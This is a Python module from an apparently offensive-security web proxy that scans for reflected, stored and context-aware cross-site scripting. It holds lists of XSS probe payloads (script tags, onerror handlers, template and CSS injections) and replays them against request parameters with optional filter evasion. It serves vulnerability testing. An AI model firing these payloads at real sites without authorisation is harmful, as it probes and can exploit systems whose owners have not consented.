"""XSS detection stages for DetectionChain.

Stages
------
- ReflectedStage:       order=0, min_depth=fast     — payload reflected in response
- StoredStage:          order=1, min_depth=standard — payload persists across requests
- ContextAwareStage:    order=2, min_depth=deep     — context-aware payload selection
"""

import logging
import re
from typing import Optional

import httpx

from pwnproxy.plugins.core.base import Finding
from pwnproxy.plugins.core.chain import DetectionDepth, DetectionStage, StageResult
from pwnproxy.shared.models import Flow
from pwnproxy.shared.scan.params import InjectionPoint
from pwnproxy.shared.scan.replayer import RequestReplayer, _serialize_request

logger = logging.getLogger(__name__)

REFLECTED_PAYLOADS = [
    "<script>alert(1)</script>",
    '\"><script>alert(1)</script>',
    "<img src=x onerror=alert(1)>",
    "';alert(1);//",
    "</script><script>alert(1)</script>",
]

STORED_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "{{constructor.constructor('alert(1)')()}}",
]

CONTEXT_PAYLOADS = {
    "html": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"] ,
    "attribute": ['" onmouseover="alert(1)"', "' onfocus='alert(1)'"] ,
    "js": ["';alert(1);//", "</script><script>alert(1)</script>"] ,
    "css": ["expression(alert(1))", "background:url(javascript:alert(1))"],
}


class ReflectedStage(DetectionStage):
    order = 0
    min_depth = DetectionDepth.FAST
    capability = "reflected-xss"

    def __init__(self, replayer: RequestReplayer, evasion_level: str = "none"):
        self._replayer = replayer
        self._evasion = evasion_level

    async def execute(
        self,
        flow: Flow,
        injection_points: list[InjectionPoint],
    ) -> StageResult:
        findings: list[Finding] = []
        confirmed: set[tuple] = set()

        for point in injection_points:
            for payload in REFLECTED_PAYLOADS:
                resp = await self._replayer.replay(
                    point,
                    payload,
                    timeout=5.0,
                    evasion_level=self._evasion,
                )
                if resp is None:
                    continue

                if self._is_reflected(resp.text, payload):
                    req = self._replayer.build_payload_request(point, payload, evasion_level=self._evasion)
                    findings.append(Finding(
                        scanner="xss",
                        url=point.url,
                        method=point.method,
                        param_name=point.name,
                        param_location=point.location,
                        technique="reflected-xss",
                        severity="medium",
                        confidence="tentative",
                        payload=payload,
                        evidence=f"Payload reflected in response body (length={len(resp.text)})",
                        request_data=_serialize_request(req),
                    ))
                    confirmed.add(self._point_key(point))
                    break

        return StageResult(findings=findings, confirmed_points=confirmed)

    @staticmethod
    def _is_reflected(body: str, payload: str) -> bool:
        if payload in body:
            return True
        encoded = payload.replace("<", "%3C").replace(">", "%3E").replace('"', "%22")
        if encoded in body:
            return True
        double = encoded.replace("%", "%25")
        if double in body:
            return True
        return False

    @staticmethod
    def _point_key(point: InjectionPoint) -> tuple:
        return (point.method, point.host + point.path, point.name, point.location)


class StoredStage(DetectionStage):
    order = 1
    min_depth = DetectionDepth.STANDARD
    capability = "stored-xss"

    def __init__(self, replayer: RequestReplayer, evasion_level: str = "none"):
        self._replayer = replayer
        self._evasion = evasion_level

    async def execute(
        self,
        flow: Flow,
        injection_points: list[InjectionPoint],
    ) -> StageResult:
        findings: list[Finding] = []
        confirmed: set[tuple] = set()

        for point in injection_points:
            for payload in STORED_PAYLOADS:
                resp = await self._replayer.replay(
                    point,
                    payload,
                    timeout=5.0,
                    evasion_level=self._evasion,
                )
                if resp is None:
                    continue

                clean_resp = await self._replayer.send_clean(point, timeout=5.0)
                if clean_resp is None:
                    continue

                if self._is_reflected(clean_resp.text, payload):
                    req = self._replayer.build_payload_request(point, payload, evasion_level=self._evasion)
                    findings.append(Finding(
                        scanner="xss",
                        url=point.url,
                        method=point.method,
                        param_name=point.name,
                        param_location=point.location,
                        technique="stored-xss",
                        severity="high",
                        confidence="confirmed",
                        payload=payload,
                        evidence="Payload persisted across requests (stored XSS)",
                        request_data=_serialize_request(req),
                    ))
                    confirmed.add(self._point_key(point))
                    break

        return StageResult(findings=findings, confirmed_points=confirmed)

    @staticmethod
    def _is_reflected(body: str, payload: str) -> bool:
        if payload in body:
            return True
        encoded = payload.replace("<", "%3C").replace(">", "%3E").replace('"', "%22")
        if encoded in body:
            return True
        double = encoded.replace("%", "%25")
        if double in body:
            return True
        return False

    @staticmethod
    def _point_key(point: InjectionPoint) -> tuple:
        return (point.method, point.host + point.path, point.name, point.location)


class ContextAwareStage(DetectionStage):
    order = 2
    min_depth = DetectionDepth.DEEP
    capability = "context-aware-xss"

    def __init__(self, replayer: RequestReplayer, evasion_level: str = "none"):
        self._replayer = replayer
        self._evasion = evasion_level

    async def execute(
        self,
        flow: Flow,
        injection_points: list[InjectionPoint],
    ) -> StageResult:
        findings: list[Finding] = []
        confirmed: set[tuple] = set()

        for point in injection_points:
            resp = await self._replayer.send_clean(point, timeout=5.0)
            if resp is None:
                continue

            context = self._detect_context(resp.text, point)
            payloads = CONTEXT_PAYLOADS.get(context, REFLECTED_PAYLOADS)

            for payload in payloads:
                injected = await self._replayer.replay(
                    point,
                    payload,
                    timeout=5.0,
                    evasion_level=self._evasion,
                )
                if injected is None:
                    continue

                if self._detect_success(injected.text, payload, context):
                    req = self._replayer.build_payload_request(point, payload, evasion_level=self._evasion)
                    findings.append(Finding(
                        scanner="xss",
                        url=point.url,
                        method=point.method,
                        param_name=point.name,
                        param_location=point.location,
                        technique=f"context-aware-xss-{context}",
                        severity="high",
                        confidence="confirmed",
                        payload=payload,
                        evidence=f"Context-aware reflection in {context} context",
                        request_data=_serialize_request(req),
                    ))
                    confirmed.add(self._point_key(point))
                    break

        return StageResult(findings=findings, confirmed_points=confirmed)

    @staticmethod
    def _detect_context(body: str, point: InjectionPoint) -> str:
        param_value = point.original
        if param_value is None or param_value not in body:
            return "html"
        idx = body.index(param_value)
        before = body[max(0, idx - 50):idx]
        if re.search(r'<script[^>]*>', before):
            return "js"
        if re.search(r'\w+=[\'\"]?$', before):
            return "attribute"
        if re.search(r'<style[^>]*>', before):
            return "css"
        return "html"

    @staticmethod
    def _detect_success(body: str, payload: str, context: str) -> bool:
        if payload in body:
            return True
        if context == "attribute" and re.search(r"on\w+\s*=", body):
            return True
        if context == "js" and ("alert" in body or "prompt" in body):
            return True
        return False

    @staticmethod
    def _point_key(point: InjectionPoint) -> tuple:
        return (point.method, point.host + point.path, point.name, point.location)
